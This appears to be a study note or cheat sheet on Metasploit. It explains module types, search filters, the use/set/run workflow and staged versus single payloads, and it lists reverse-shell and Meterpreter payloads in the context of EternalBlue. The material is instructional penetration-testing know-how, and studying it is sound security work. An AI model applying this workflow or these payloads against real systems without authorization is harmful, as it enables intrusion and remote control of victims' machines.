---
title: Modules & Payloads
tags: [metasploit, msfconsole, exploitation, payloads]
---

# Modules & Payloads
> Modules are prepared scripts with a specific purpose — already developed and tested. Payloads are the code that runs on the target after exploitation.

## Module Syntax

```
<No.> <type>/<os>/<service>/<name>

Example:
794   exploit/windows/ftp/scriptftp_list
```

## Module Types

| Type | Purpose |
|------|---------|
| `Auxiliary` | Scanning, fuzzing, sniffing, admin tasks |
| `Encoders` | Ensure payloads arrive intact (obfuscation) |
| `Exploits` | Exploit a vulnerability to deliver a payload |
| `NOPs` | No Operation code — keep payload sizes consistent |
| `Payloads` | Code that runs remotely and calls back to attacker |
| `Plugins` | Additional scripts that integrate with msfconsole |
| `Post` | Post-exploitation: gather info, pivot, escalate |

---

## Searching for Modules

```bash
# Basic search
msf6 > search eternalromance

# Filtered search
msf6 > search eternalromance type:exploit

# Advanced filters
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

**Search filters:**

| Filter | Example |
|--------|---------|
| `cve:` | `cve:2021` |
| `platform:` | `platform:windows` |
| `type:` | `type:exploit` |
| `rank:` | `rank:excellent` |

---

## Using a Module

```bash
use <number_or_path>

# View required options
show options

# View target info and description
info

# View vulnerable versions
show targets

# Set options
set RHOSTS <target_IP>
set LHOST <your_IP>

# Run
run
```

---

## Payload Types

### Singles vs Staged

| Type | Naming | Description |
|------|--------|-------------|
| **Single** | `windows/shell_reverse_tcp` (underscore) | Self-contained — exploit + shellcode in one |
| **Stager** | `windows/shell/reverse_tcp` (slash) | Small, reliable — sets up the connection channel |
| **Stage** | Delivered by stager | Larger payload sent after stager connects; grants shell |

**Stage0** (`reverse_tcp`, `reverse_https`, `bind_tcp`) — initializes the connection back to attacker.  
**Stage1** — delivers the full payload (shell, meterpreter, etc.).

### Searching for Payloads

```bash
msf6 > show payloads

# Filter payloads with grep
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
```

### Common Payload Reference

| Payload | Description |
|---------|-------------|
| `generic/shell_bind_tcp` | Generic shell, TCP bind |
| `generic/shell_reverse_tcp` | Generic shell, reverse TCP |
| `windows/x64/shell_reverse_tcp` | Single — normal shell, reverse TCP |
| `windows/x64/shell/reverse_tcp` | Staged — normal shell, reverse TCP |
| `windows/x64/meterpreter/reverse_tcp` | Staged — Meterpreter, reverse TCP |
| `windows/x64/powershell/reverse_tcp` | Staged — interactive PowerShell |
| `windows/x64/vncinject/reverse_tcp` | Staged — VNC server injection |
| `windows/x64/exec` | Execute arbitrary command |
| `windows/x64/messagebox` | Spawn a MessageBox dialog (PoC) |
